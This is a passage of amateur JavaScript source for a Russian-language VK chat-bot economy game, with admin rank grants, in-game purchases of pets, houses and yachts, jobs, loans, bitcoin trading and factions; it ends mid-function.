 vk.updates.hear(/^(?:timevip)?\s([0-9]+)?\s?([0-9]+)?/i, (message) => { 
 	let user = acc.users[user_id(message.user)];
 	if(user.full == false) return;
 	let id = user_id(message.user);
 	if(!message.$match[2] || !Number(message.$match[1]) || !Number(message.$match[2]) || !acc.users[message.$match[1]] || message.$match[2] > 999 || message.$match[2] < 1) return message.send(`⏺ ➾ Проверьте вводимые данные:\n⏺ ➾ timeevip [ID] [Время(1-999)](дней)`);
 	let time = message.$match[2] * 24;
 	acc.users[message.$match[1]].adm_time = time;
 	acc.users[message.$match[1]].level = 1;
 	return message.send(`💰 ➾ Вы выдали VIP Профиль игроку [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] на ${message.$match[2]} дней.`); 
 });



 vk.updates.hear(/^(?:timemoder)?\s([0-9]+)?\s?([0-9]+)?/i, (message) => { 
 	let user = acc.users[user_id(message.user)];
 	if(user.full == false) return;
 	let id = user_id(message.user);
 	if(!message.$match[2] || !Number(message.$match[1]) || !Number(message.$match[2]) || !acc.users[message.$match[1]] || message.$match[2] > 999 || message.$match[2] < 1) return message.send(`⏺ ➾ Проверьте вводимые данные:\n⏺ ➾ timemoder [ID] [Время(1-999)](дней)`);
 	let time = message.$match[2] * 24;
 	acc.users[message.$match[1]].adm_time = time;
 	acc.users[message.$match[1]].level = 2;
 	return message.send(`💰 ➾ Вы выдали Уровень доступа: Модератор игроку [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] на ${message.$match[2]} дней.`); 
 });

 vk.updates.hear(/^(?:timeadm)?\s([0-9]+)?\s?([0-9]+)?/i, (message) => { 
 	let user = acc.users[user_id(message.user)];
 	let id = user_id(message.user);
 	if(user.full == false) return;
 	if(!message.$match[2] || !Number(message.$match[1]) || !Number(message.$match[2]) || !acc.users[message.$match[1]] || message.$match[2] > 999 || message.$match[2] < 1) return message.send(`⏺ ➾ Проверьте вводимые данные:\n⏺ ➾ timeadm [ID] [Время(1-999)](дней)`);
 	let time = message.$match[2] * 24;
 	acc.users[message.$match[1]].adm_time = time;
 	acc.users[message.$match[1]].level = 3;
 	return message.send(`💰 ➾ Вы выдали Уровень дотупа: Администратор игроку [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] на ${message.$match[2]} дней.`); 
 });









 cm.hear(/^(?:full)\s?([0-9]+)?\s?([0-9]+)?/i,  (message) => { 	 
 	if (message.user != 287908009) {
 		message.reply('Только для Разработчика.');
 		return message.sendSticker(13475);
 	}
 	if(!message.$match[1] || !message.$match[2]) return message.send(`Пример команды: Full [ID] [Уровень доступа: (1-5)] - Фулл Доступ: Позволяет управлять Администрацией не имея должности "Создатель"`); 
 	if(message.$match[2] > 7) return message.send(`Максимальный уровень доступа: 7`)
 		if(!acc.users[message.$match[1]]) return message.send(`Такого игрока нет!`); 
 	acc.users[message.$match[1]].level = Number(message.$match[2]);
 	logs(user_id(message.user), message.$match[1], message.$match[2], type = 4)
 	var bd = acc.users[user_id(message.user)];
 	vk.api.call('messages.send', {
 		peer_id: acc.users[message.$match[1]].id,
 		message: `✅ «@id${bd.id} (${bd.prefix})» выдал  вам должность: (${message.$match[2].toString().replace(/0/gi, "Игрока").replace(/1/gi, "VIP`a").replace(/2/gi, "Модератора").replace(/3/gi, "Администратора").replace(/4/gi, "Ст. Администратора").replace(/5/gi, "Гл. Администратора").replace(/6/gi, "Спец Администратора").replace(/7/gi, "Разработчик")}).`,
 		random_id: 0 
 	});
 	var is = [user_id(message.user), message.text]
 	return message.send(`🔸 «@id${bd.id} (${bd.prefix})» вы выдали игроку «@id${acc.users[message.$match[1]].id} (${acc.users[message.$match[1]].prefix})» Уровень Доступа: (${message.$match[2].toString().replace(/0/gi, "Игрок").replace(/1/gi, "VIP").replace(/2/gi, "Модератор").replace(/3/gi, "Администратор").replace(/4/gi, "Ст. Администратор").replace(/5/gi, "Гл. Администратор").replace(/6/gi, "Спец Администратор").replace(/7/gi, "Разработчик")}).`);
 });

 vk.updates.hear(/^(?:boostzp)\s?([0-9]+)?\s?([0-9]+)?/i,(message) => {
 	let id = user_id(message.user);	 	 
 	if(user.full == false) return;
 	let user = acc.users[user_id(message.user)];  
 	if(!message.$match[1] || !message.$match[2]) return message.send(`🔸 >> Пример команды: boostzp ID LVL(1-24)`);  
 	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`); 
 	acc.users[message.$match[1]].autozp = Number(message.$match[2]);
 	return message.send(`🔸 >> Вы выдали игроку [${acc.users[message.$match[1]].prefix}] автосбор зарплат на (${message.$match[2]}) раз `);
 });
 vk.updates.hear(/^(?:boostbiz)\s?([0-9]+)?\s?([0-9]+)?/i, (message) => {
 	let id = user_id(message.user);	 	 
 	if(user.full == false) return;
 	let user = acc.users[user_id(message.user)];  
 	if(!message.$match[1] || !message.$match[2]) return message.send(`🔸 >> Пример команды: boostbiz ID LVL(1-24)`);  
 	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`); 
 	acc.users[message.$match[1]].autobiz = Number(message.$match[2]);
 	return message.send(`🔸 >> Вы выдали игроку [${acc.users[message.$match[1]].prefix}] автосбор прибыли на (${message.$match[2]}) раз `);
 });



 vk.updates.hear(/^(?:питомцы)\s?([0-9]+)?/i, message => {
 	if(!message.$match[1]){  
 		return message.send(`
 			🐼 Питомцы 🐼

 			🐌1. Улитка.
 			🐋2. Кит.
 			🐑3. Овца.
 			🐔4. Курица.
 			🐨5. Коала.
 			🐝6. Оса.
 			🐷7. Свинья.
 			🐘8. Слон.
 			🐵9. Мартышка.
 			🐧10. Пингвин.
 			🐅11. Тигр.
 			🐶12. Волк.
 			🐰13. Заяц.
 			🐄14. Корова.
 			🦁15. Лев.

 			💵 ➾ Цена питомца: 1.000.000$

 			Для покупки введите "Питомцы [номер]"
 			Для продажи введите "Продать питомца"
 			[Деньги не возвращаются]
 			`);
 	}
 	let i = message.$match[1];
 	let user = acc.users[user_id(message.user)];  
 	let names = [0,'Улитка','Кит','Овца','Курица','Коала','Оса','Свинья','Слон','Мартышка','Пингвин','Тигр','Волк','Заяц','Корова','Лев']
 	if(i < 0 || i > 15) return;
 	if(user.pit != false) return message.send(`🐼 ➾ У вас уже куплен питомец`);
 	if(i > 0 && i <= 15){
 		if(user.balance < 1000000) return message.send(`🐼 ➾ У вас не достаточно $.`);
 		user.balance -= 1000000;
 		user.pit = names[i];
 		return message.send(`🐼 ➾ Вы купили питомца (${names[i]}) за 1.000.000$`)
 	}

 });

 vk.updates.hear(/^(?:Продать питомца)/i,  message => {
 	let user = acc.users[user_id(message.user)];
 	if(user.pit == false) return message.send(`У вас нет питомца`);
 	user.pit = false;
 	return message.send(`🐼 ➾ Вы успешно продали питомца.`);
 });
 ///////////////////////////////////////////////////////
 

 vk.updates.hear(/^(?:дома)\s?([0-9]+)?/i, message => {
 	if(!message.$match[1]){  
 		return message.send(`
 			дома: 
 			🔸 1. Коробка из-под холодильника (20.000$) 
 			🔸 2. Подвал (50.000$) 
 			🔸 3. Палатка (150.500$) 
 			🔸 4. Домик на дереве (300.000$) 
 			🔸 5. Полуразрушенный дом (500.000$) 
 			🔸 6. Дом в лесу (700.000$) 
 			🔸 7. Дом в Европе (1.000.000$) 
 			🔸 8. Дача (1.500.000$) 
 			🔸 9. Дом на пляже (2.000.000$) 
 			🔸 10. Большой Коттедж (5.000.000$) 
 			🔸 11. Особняк (11 ❤) 
 			🔹 12. Дом на Рублёвке (150 ❤) 

 			Для покупки введите "Дома [номер]"
 			Для продажи введите "Продать дом"
 			[Деньги не возвращаются]
 			`);
 	}
 	let i = message.$match[1];
 	let user = acc.users[user_id(message.user)]; 
 	let count = [0, 20000,50000,150000,300000,500000,700000,1000000,1500000,2000000,5000000,100,150,300];
 	let names = [0, 'Коробка','Подвал','Палатка','Домик на дереве','Полуразрушенный дом','Дом в лесу','Дом в Европе','Дача','Дом На Пляже','Большой Коттедж','Особняк','Дом на Рублёвке','Личный небоскрёб']
 	if(i < 0 || i > 13) return;
 	if(user.house != false) return message.send(`🏢 ➾ У вас уже куплен дом`);
 	if(i > 0 && i <= 10){
 		if(user.balance < count[i]) return message.send(`🏢 ➾ У вас не достаточно сердечек❤.`);
 		user.balance -= count[i];
 		user.house = names[i];
 		return message.send(`🏢 ➾ Вы купили дом (${names[i]}) за ${count[i]}$`)
 	}
 	if(i > 11 && i < 13){
 		if(user.donate < count[i]) return message.send(`🏢 ➾ У вас не достаточно сердечек❤.`);
 		user.donate -= count[i];
 		user.house = names[i];
 		return message.send(`🏢 ➾ Вы купили дом (${names[i]}) за ${count[i]} сердечек❤`)
 	}
 });

 vk.updates.hear(/^(?:продать дом)/i,  message => {
 	let user = acc.users[user_id(message.user)];
 	if(user.house == false) return message.send(`У вас нет дома`);
 	user.house = false;
 	return message.send(`🏢 ➾ Вы успешно продали дом государству.`);
 });





 vk.updates.hear(/^(?:яхты)\s?([0-9]+)?/i, message => {
 	if(!message.$match[1]){
 		return message.send(`
 			⛵Обычнее Яхты ⛵ 
 			➖➖➖➖➖➖➖➖➖➖
 			🔵1 - Carer X- 
 			🔴10.000.000💷
 			➖➖➖➖➖➖➖➖➖➖
 			🔴2.Nauticat F 
 			🔴15.000.000💷
 			➖➖➖➖➖➖➖➖➖➖
 			🔵3. Nordhavn 56 MS 
 			🔴50.000.000💷✔
 			➖➖➖➖➖➖➖➖➖➖
 			🔴4. Princess 60
 			🔵100.000.000💷✔
 			➖➖➖➖➖➖➖➖➖➖
 			🚤Дорогие Катера🚤 
 			➖➖➖➖➖➖➖➖➖➖
 			🔵5. Azimut 70 
 			🔴200.000.000💷✔
 			➖➖➖➖➖➖➖➖➖
 			🔴6. Dominator 40M
 			🔵300.000.000💷✔
 			➖➖➖➖➖➖➖➖➖➖
 			🔵7. Moonen 124 
 			🔴450.000.000💷✔
 			➖➖➖➖➖➖➖➖➖➖
 			🔴8. Wider 150 
 			🔵650.000.000💷✔
 			➖➖➖➖➖➖➖➖➖➖
 			🔵9. Palmer Johnson 42M 
 			🔴800.000.000💷✔
 			➖➖➖➖➖➖➖➖➖➖
 			🔴10. Wider FR 
 			🔵1.000.000.000💷✔
 			➖➖➖➖➖➖➖➖➖➖
 			🛥Люксовые Яхты🛥
 			➖➖➖➖➖➖➖➖➖➖
 			🔴🔵11. Browns- 250 сердечек❤
 			➖➖➖➖➖➖➖➖➖➖
 			🔴🔵12. Golden Sky- 500 сердечек❤

 			Для покупки введите "Яхты [номер]"
 			Для продажи введите "Яхты продать"
 			[Деньги не возвращаются]
 			`);
 	}
 	let i = message.$match[1];
 	let user = acc.users[user_id(message.user)];
 	let count = [0, 10000000,15000000, 50000000,10000000,200000000,300000000,450000000,650000000,800000000,1000000000,250,500];
 	let names = [0, 'Carer X','Nauticat F','Nordhavn 56 MS','Princess 60','Azimut 70','Dominator 40M','Moonen 124','Wider 150','Palmer Johnson 42M','Wider FR','Browns','Golden Sky']
 	if(i < 0 || i > 12) return;
 	if(user.lodka != false) return message.send(`🛥 ➾ У вас уже куплена Яхта`);
 	if(i > 0 && i <= 10){
 		if(user.balance < count[i]) return message.send(`🛥 ➾ У вас не достаточно денег.`);
 		user.balance -= count[i];
 		user.lodka = names[i];
 		return message.send(`🛥 ➾ Вы купили яхту (${names[i]}) за ${count[i]}$`)
 	}else{
 		if(user.donate < count[i]) return message.send(`У вас не достаточно сердечек❤.`);
 		user.donate -= count[i];
 		user.lodka = names[i];
 		return message.send(`🛥 ➾ Вы купили яхту (${names[i]}) за ${count[i]} сердечек❤`)
 	}
 });

 vk.updates.hear(/^(?:яхта продать)/i, message => {
 	let user = acc.users[user_id(message.user)]; 
 	if(user.lodka == false) return message.send(`🛥 ➾ У вас нет яхты`);
 	user.lodka = false;
 	return message.send(`🛥 ➾ Вы успешно продали яхту государству.`);
 });


//\\\\\\\\\\\ РАБОТЫ \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\



vk.updates.hear(/^(?:работы)\s?([0-9]+)?/i, message => {
	if(!message.$match[1]){
		return message.send(`
			👨‍⚖️ работы 👨‍⚖️  
			
			⬛ 1. Шахтер  | 1к/ч |[0]
			⬛ 2. Электрик | 5к/ч |[10]
			⬛ 3. Торговец | 10к/ч |[20]
			⬛ 4. Дальнобойщик | 15к/ч |[30]
			⬛ 5. Бизнесмен | 20к/ч |[40]
			⬛ 6. Нефтяник | 25к/ч |[50]
			⬛ 7. Депутат | 35к/ч |[65]
			⬛ 8. Министр Финансов |  45к/ч |[70]
			⬛ 8. Мэр |  60к/ч |[80]
			⬛ 9. Президент | 80к/ч |[100]


			В [] требуемый уровень стажа. 
			Для получения зарплаты и +1 стажа ежечасно прописывайте: 'Работать'

			Чтобы устроиться введите: "работы [номер]"
			Для увольнения введите: "уволиться"
			Трудовая книжка: 'Книжка'
			Для работы введите: 'Работать'
			`);
	}
	let i = message.$match[1];
	let user = acc.users[user_id(message.user)];  
	if(user.lvl < 2) return message.send(`👨‍ ➾ Устроиться на работу можно имея 2 уровень\n💳 ➾ Ваш уровень [${user.lvl}]`);
	let names = [0, 'Шахтер','Электрик','Торговец','Дальнобойщик','Бизнесмен','Бизнесмен','Нефтяник','Депутат','Министр Финансов','Мэр','Президент']
	let staj = [0,0,10,20,30,40,50,65,70,80,100]
	let counts = [0,1000,5000,10000,15000,20000,25000,35000,45000,60000,80000]
	if(i <= 0 || i > 7) return;
	if(user.job.name != false) return message.send(`👨‍ ➾ У вас уже есть работа`);
	if(i > 0 && i <= 7){
		if(user.job.lvl < staj[i]) return message.send(`👨‍ ➾ У вас не достаточный стаж.`); 
		if(staj[i] > user.job.lvl) return message.send(`👨‍ ➾ У вас не достаточный стаж.`); 
		user.job.name = names[i];
		user.job.count = Number(counts[i]); 
		return message.send(`👨‍⚖️ ➾ Вы устроились на работу `)
	} 
});

vk.updates.hear(/^(?:уволиться)/i, message => {
	let user = acc.users[user_id(message.user)];
	if(user.job.name == false) return message.send(`👨‍⚖️ ➾ У вас нет работы.`);
	user.job.name = false;
	user.job.count = 0; 
	return message.send(`👨‍⚖️ ➾ Вы успешно уволились.`);
});

vk.updates.hear(/^(?:книжка)/i, message => {
	let user = acc.users[user_id(message.user)]; 
	let text = '';
	if(user.job.name == false){ text = 'отсутствует' }else{
		text = user.job.name
	} 
	return message.send(`
		📝 Трудовая книжка 📝
		📋 Стаж работы: ${user.job.lvl} 
		📋 Работа: ${text}
		📋 Зарплата: ${user.job.count}$/час
		`);
});

vk.updates.hear(/^(?:работать)/i, message => {
	let user = acc.users[user_id(message.user)]; 
	let text = '';
	if(user.job.name == false) return message.send(`👨‍⚖️ ➾ У вас нет работы.`);
	if(user.job_stop != false) return message.send(`👨‍⚖️ >> Работать можно раз в час.`);
	var counts = user.job.count
	user.balance += Number(user.job.count); 
	user.job.lvl += 1;

	user.job_stop = true;
	setTimeout(() => {
		user.job_stop = false;
	}, 3600000);


	return message.send(`
		📝 ➾ Вы отработали час. +1 к стажу. +${counts}$ 
		`);
});

vk.updates.hear(/^(?:сократи)\s?([^]+)?/i, message => { 
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
	let cc = message.$match[1].toLowerCase(); 
	let text = message.$match[1]; 
	let stick = [8480,11997,12116,11565,11607,6111,6119,10327,10335,10336,11098,11097,11094,4277,4278,4284,4296,8484,4318,11240,11249,11242,11120,11121,10354,10359,10360,7322,7327,7331,7330,7328,303,308,301,7470,10874,10407,8471,10413,8472,5823].random();
	if(!text) return message.send(`${rnick}, Произошла ошибка.\n -- Введите: "Сократи [Сcылка]`); 
	vk.api.call("utils.getShortLink", {url: text}).then(function (res){ 
		if(!text) return message.send(`${rnick}, Произошла ошибка.\n -- Введите: "Сократи [Сcылка]`); 
		message.send(`${rnick}, Проверяем доступность ссылки..`); 
		setTimeout(() => {message.send(`Генерируем ссылку...`); }, 4000); 
		setTimeout(() => {message.send(`Проверка DNS соеденения..`); }, 6000); 
		setTimeout(() => {message.send(`Готовим к отправке..`); }, 8000); 
		setTimeout(() => {message.send(`${rnick}, ваша ссылка готова: ` + res.short_url); }, 10000); 
		setTimeout(() => {message.send({sticker_id: stick}); }, 11000); 
	}); 
});



///////////////////////////////////////////////////////////////////////////////

vk.updates.hear(/^(?:кредит)\s?([0-9]+)?/i,  message => {
	let user = acc.users[user_id(message.user)];
	if(user.lvl < 3) return message.send(`💳 ➾ Брать кредит можно имея 3 уровень\n💳 ➾ Ваш уровень [${user.lvl}]`);
	if(user.credit != 0) return message.send(`💳 ➾ Чтобы взять кредит, нужно погасить старый: [${spaces(user.credit)}$]`);
	if(!message.$match[1] || message.$match[1] <= 0 ) return message.send(`💳 ➾ Вы не указали сумму`);
	if(message.$match[1] < 100000 || message.$match[1] > 10000000) return message.send(`💳 ➾ Минимальная сумма кредита 100.000$\n💳 ➾ Максимальная сумма кредита 10.000.000$`);
	user.balance += Number(message.$match[1]);
	let dolg = Number(message.$match[1]) / 100 * 15;
	dolg += Number(message.$match[1]);
	user.credit = Number(dolg);
	user.procent = Number(message.$match[1] / 100 * 15);
	return message.send(`
		💳 ➾ Вы взяли кредит на сумму: ${spaces(message.$match[1])}$
		💳 ➾ К погашению: ${spaces(dolg)}$
		💳 ➾ Ежечасно будет списываться: ${spaces(message.$match[1] / 100 * 15)}$
		`);
});

vk.updates.hear(/^(?:погасить)\s?([0-9]+)?/i, message => {
	let user = acc.users[user_id(message.user)];
	if(user.credit == 0) return message.send(`💳 ➾ у вас нет кредита`);
	if(!message.$match[1] || message.$match[1] <= 0 ) return message.send(`💳 ➾ Вы не указали сумму.`);
	if(user.credit > user.balance) return message.send(`💳 ➾ У вас не достаточно денег.`);
	if(user.credit > message.$match[1]) return message.send(`💳 ➾ Оплатить кредит можно одним вкладом. [${spaces(user.credit)}$]`);
	if(user.credit < message.$match[1]) return message.send(`💳 ➾ Введите точную сумму к погашению. [${spaces(user.credit)}$]`);

	user.balance -= Number(message.$match[1]);
	user.credit -= Number(message.$match[1]);
	user.procent = 0;
	return message.send(`
		💳 ➾ Вы успешно погасили весь кредит.
		`);
});


vk.updates.hear(/^(?:биткоины)\s?([0-9]+)?/i, message => {
	let user = acc.users[user_id(message.user)];
	let btc = Number(message.$match[1])
	let ch = acc.bit;
	if(user.act == false) return message.send(`Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'.`);

	if(!btc) return message.send(`👑 Укажите количество Биткоинов.`);
	if(user.balance < btc*ch) return message.send(`👑  1 биткоин стоит ${spaces(ch)}$\n Для покупки ${spaces(btc)}฿, нужно ${spaces(btc*ch)}$`)
		user.balance -= btc*ch;
	user.bitcoin += btc;
	return message.send(`Вы успешно купили ${spaces(btc)}฿`);
});


vk.updates.hear(/^(?:продать биткоины)\s?([0-9]+)?/i, message => {
	let user = acc.users[user_id(message.user)];
	let btc = Number(message.$match[1])
	let ch = acc.bit;

	if(!btc) {
		message.send(`Вы успешно продали все свои биткоины за ${spaces(user.bitcoin*ch)}$`);
		user.balance += user.bitcoin*ch;
		return user.bitcoin -= user.bitcoin;		
	}
	if(user.bitcoin < btc) return message.send(`👑 У вас нет столько биткоинов.`)
		user.balance += btc*ch;
	user.bitcoin -= btc;
	return message.send(`Вы успешно продали ${spaces(btc)}฿ за ${spaces(btc*ch)}$`);
});


vk.updates.hear(/^(?:лотерея)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.balance < 5000) return message.send(`💣 @id${user.id}(${user.prefix}), Лотерейный билетик стоит 5000$`);
	user.balance -= 5000;
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		user.balance += 500;
		return message.send(`💣 @id${user.id}(${user.prefix}), Вам попалась неудачный билет.\n👒 ➾ Вы выиграли 500$`);
	}else{ 
		let count = [3000,5000,10000,15000,20000].random();
		user.balance += count;
		return message.send(`🎉 @id${user.id}(${user.prefix}), Удачный билетик!\n👒 ➾ Вы получили ${count}$`);
	}
});



  ////////////////
  vk.updates.hear(/^(?:рейтинг)\s?([0-9]+)?/i, message => {
  	let user = acc.users[user_id(message.user)];
  	let reit = Number(message.$match[1])
  	let st = 250000000;
  	if(user.act == false) return message.send(`Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'.`);

  	if(!reit) return message.send(`👑  Укажите количество рейтинга.`);
  	if(user.balance < reit*st) return message.send(`👑1 рейтинг стоит 250.000.000$\nДля покупки ${spaces(reit)}👑, нужно ${spaces(reit*st)}$`)
  		user.balance -= reit*st;
  	user.global_exs += reit;
  	return message.send(`👑 Вы успешно купили ${spaces(reit)} рейтинга`);
  });


  vk.updates.hear(/^(?:продать рейтинг)\s?([0-9]+)?/i, message => {
  	let user = acc.users[user_id(message.user)];
  	let reit = Number(message.$match[1])
  	let st = 250000000;

  	if(!reit) {
  		message.send(`👑 Вы успешно продали весь свой рейтинг за ${spaces(user.global_exs*st)}$`);
  		user.balance += user.global_exs*st;
  		return user.global_exs -= user.global_exs;		
  	}
  	if(user.global_exs < reit) return message.send(`👑 У вас нет столько рейтинга.`)
  		user.balance += reit*st;
  	user.global_exs -= reit;
  	return message.send(`👑 Вы успешно продали ${spaces(reit)} рейтинга за ${spaces(reit*st)}$`);
  });







  vk.updates.hear(/^(?:создать фракцию)\s?([^]+)?/i,  (message) => { 
  	let id = user_id(message.user)
  	let user = acc.users[user_id(message.user)];
  	if(user.donate < 50) return message.send(`📘 ➾ Создание фракции стоит 50 сердечек❤`);
  	if(!message.$match[1]) return message.send(`📘 ➾ Напишите название для фракции.`);
  	if(acc.users[id].frac_name != false) return message.send(`📘 ➾ Вы уже находитесь во фракции`);
  	let args =  message.$match[1];
  	if(frac[args]) return message.send(`📘 ➾ Фракция с таким названием уже существует.`);
  	frac[args] = {
  		users: {},
  		balance: 0,
  		bank: 0,
  		people: 1, 
  		counts: 0,
  		owner: message.user
  	}
  	frac[args].users[id] = {
  		count: 0
  	}
  	user.frac_name = args;
  	return message.send(`
  		📘 ➾ Вы создали фракцию "${args}"
  		📘 ➾ Информация: "Фракция"
  		`);
  }); 

  vk.updates.hear(/^(?:фракции)/i,  (message) => { 
  	let text = '📘 ➾ Список фракций:\n\n'
  	for(i in frac){
  		text += `💼 ➾ Название: ${i} | Владелец: @id${frac[i].owner}(${acc.users[user_id(frac[i].owner)].prefix})\n`
  	}
  	return message.send(`
  		${text}
  		`);
  });

  vk.updates.hear(/^(?:войти)\s?([^]+)?/i,  (message) => { 
  	let id = user_id(message.user)
  	let user = acc.users[user_id(message.user)]; 
  	if(frac[message.$match[1]].owner == message.user) return message.send(`📘 ➾ Вы итак создатель фракции!`); 
  	if(!message.$match[1]) return message.send(`📘 ➾ Напишите точное название фракции, где хотите работать. (Учитывая регистр/знаки/символы/смайлы)`);
  	if(acc.users[id].frac_name != false) return message.send(`📘 ➾ Вы уже находитесь во фракции`);
  	let args = message.$match[1];
  	if(!frac[args]) return message.send(`📘 ➾ Фракция с таким названием не существует.`);
  	if(frac[args].people >= 10) return message.send(`📘 ➾ Максимальное кол-во работников во фракции 10.`)
  		frac[args].people += 1;
  	frac[args].users[id] = {
  		count: 0
  	}
  	user.frac_name = args;
  	return message.send(`
  		📘 ➾ Вы вступили во фракцию "${args}"
  		📘 ➾ Информация: "Фракция"
  		`);
  }); 

  vk.updates.hear(/^(?:выйти)/i,  (message) => { 
  	let id = user_id(message.user)
  	let user = acc.users[user_id(message.user)];  
  	if(acc.users[id].frac_name == false) return message.send(`📘 ➾ Вы не находитесь во фракции`);      
  	let name = acc.users[id].frac_name;
  	if(frac[name].owner == message.user) return message.send(`📘 ➾ Создатель фракции не может её покинуть!`); 

  	frac[name].people -= 1;
  	delete frac[name].users[id];

  	user.frac_name = false;
  	return message.send(`
  		📘 ➾ Вы покинули фракцию "${name}" 
  		`);
  });

  vk.updates.hear(/^(?:фракция снять)/i,  (message) => { 
  	let id = user_id(message.user)
  	let user = acc.users[user_id(message.user)];  
  	if(acc.users[id].frac_name == false) return message.send(`📘 ➾ Вы не находитесь во фракции`);      
  	let name = acc.users[id].frac_name;
  	if(frac[name].owner != message.user) return message.send(`📘 ➾ Команда доступна создателю фракции!`); 
  	let sum = frac[name].balance;
  	frac[name].balance = 0;
  	user.balance += Number(sum);
  	return message.send(`
  		💴 ➾ Вы сняли с баланса фракции ${sum}$
  		`);
  });

  vk.updates.hear(/^(?:отработать|отсосать)/i,  (message) => { 
  	let id = user_id(message.user)
  	let user = acc.users[user_id(message.user)];  
  	if(acc.users[id].frac_name == false) return message.send(`📘 @id${user.id}(${user.prefix}), Вы не находитесь во фракции`);  
  	if(user.bloks_frac == true) return message.send(`📘 @id${user.id}(${user.prefix}), Работать можно раз в 10 минут)`);     
  	let name = acc.users[id].frac_name; 

  	frac[name].users[id].count += 1;
  	frac[name].bank += 5000;

  	user.bloks_frac = true; 
  	setTimeout(() => {
  		user.bloks_frac = false;
  	}, 360000);


  	return message.send(`
  		📘 ➾ Вы отработали 10 минут на работе.
  		💰 ➾ +5.000$ в копилку фракции.

  		💴 ➾ Раз в 2 часа выдается зарплата за вашу работу.
  		`);
  });

  vk.updates.hear(/^(?:фракция)$/i, (message) => { 
  	let id = user_id(message.user)
  	let user = acc.users[user_id(message.user)];

  	if(acc.users[id].frac_name == false){
  		return message.send(`
  			💼 ➾ Информация о фракции:

  			🔸 ➾ Вступить во фракцию: 'Войти <название фракции>'
  			🔸 ➾ Покинуть фракцию: 'Выйти'
  			🔸 ➾ Фракция снять - снять все деньги(для создателя)

  			🔸 ➾ Чтобы фракция приносила прибыль, нужны рабочие.
  			🔸 ➾ Рабочие добровольно могут устроиться во фракцию.
  			🔸 ➾ Для устройства им нужно прописать: 'Войти <название фракции>'
  			🔸 ➾ Максимальное количество рабочих - 10.
  			🔸 ➾ Каждые 10 минут рабочие должны писать команду 'Отработать'.
  			🔸 ➾ За каждое написание в копилку фракции идет 5000$.
  			🔸 ➾ Каждые 2 часа сумма из копилки переходит на счет фракции и делится автоматически между создателем фракции(10% от прибыли) и работниками(90% от прибыли).

  			`);
  	}
  	let text = '';
  	for(i in frac[user.frac_name].users){
  		text += `🔻 ➾ @id${acc.users[i].id}(${acc.users[i].prefix}) | [${frac[user.frac_name].users[i].count}] раз за 2 часа\n`
  	}
  	return message.send(`
  		📘 ➾ Название фракции "${user.frac_name}"
  		📑 ➾ Работников: ${frac[user.frac_name].people}
  		💴 ➾ В копилке: ${frac[user.frac_name].bank}$
  		💰 ➾ На счету: ${frac[user.frac_name].balance}$

  		👑 ➾ Создатель: @id${frac[user.frac_name].owner}(${acc.users[user_id(frac[user.frac_name].owner)].prefix})

  		💼 ➾ Статистика отработки:
  		${text}

  		💼 ➾ Информация о фракции:

  		🔸 ➾ Чтобы фракция приносила прибыль, нужны рабочие.
  		🔸 ➾ Рабочие добровольно могут устроиться во фракцию.
  		🔸 ➾ Для устройства им нужно прописать: 'Войти <название фракции>'
  		🔸 ➾ Максимальное количество рабочих - 10.
  		🔸 ➾ Каждые 10 минут рабочие должны писать команду 'Отработать'.
  		🔸 ➾ За каждое написание в копилку фракции идет 5000$.
  		🔸 ➾ Каждые 2 часа сумма из копилки переходит на счет фракции и делится автоматически между создателем фракции(10% от прибыли) и работниками(90% от прибыли).

  		`);
  }); 

  vk.updates.hear(/^(?:крутить)$/i, (message) => { 
  	let a = cases.random(); 
  	let user = acc.users[user_id(message.user)];
  	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)

  	if(user.balance < 100000) return message.send(`💸 ${rnick}, Оружейный кейс стоит 100.000$`);
	if(user.bloks_gun_case > getUnix()) return message.send(`${rnick}, до следующей прокрутки осталось: ${unixStampLeft(user.bloks_gun_case - Date.now())}`); // Лимит 
	user.balance -= 100000;
	user.bloks_gun_case = getUnix() + 60000 

	user.uron = a.uron;
	user.gun_name = a.name;



	message.reply(`Раскручивам рулетку..`);
	setTimeout(() => {message.send(`Прокрутка...`); }, 1199); 
	setTimeout(() => {return message.send(`Вам выпало: \n -- Категория: Оружие\n -- Название: ${a.name}\n -- Урон: ${a.uron} едениц.`); }, 2199);
});


  let cases = [
  {
  	uron: 36,
  	name: 'Пистолет "Deagle"'
  },
  {
  	uron: 36,
  	name: 'Автомат "M4A4"'
  }, 
  {
  	uron: 55,
  	name: `Дробовик "Sawed-Off"`
  },
  {
  	uron: 43,
  	name: `Пистолет "Five-SeveN | Испытание огнём"`
  },
  {
  	uron: 37,
  	name: `Автомат "AK-47"`
  },
  {
  	uron: 35,
  	name: `Автомат "AUG"`
  },
  {
  	uron: 34,
  	name: `Автомат "Galil AR"`
  },
  {
  	uron: 37,
  	name: `Пистолет-Пулемет "ПП-19 Бизон"`
  },
  {
  	uron: 44,
  	name: `Пистолет-Пулемет "MP9"`
  },
  {
  	uron: 45,
  	name: `Пистолет-Пулемет "UMP-45"`
  }, 
  {
  	uron: 55,
  	name: `Пистолеты "Dual Berettas | Удар кобры"`
  },
  {
  	uron: 49,
  	name: `Дробовик "Nova | Экзо"`
  },
  {
  	uron: 43,
  	name: `Пистолет "Desert Eagle | Директива"`
  },
  {
  	uron: 45,
  	name: `Револьвер "R8 | Кровавая паутина"`
  },
  {
  	uron: 75,
  	name: `AWP | Asimov`
  }

  ]

  async function run() {
  	await vk.updates.startPolling();
  	console.log('[Система]: бот успешно активирован!');
  	restart();
  }

  run().catch(console.error);

  vk.updates.hear(/^(?:рестарт|restart|reboot|sr|rl)$/i, (message) => {
  	let user = acc.users[user_id(message.user)];		
      if(user.full == false) return message.send(`<Error #403>`); // Доступ.
      message.send(`Запущен процесс перезапуска системы..`)
      message.send(`Процесс завершён на: ${rand(1,9)}%`)
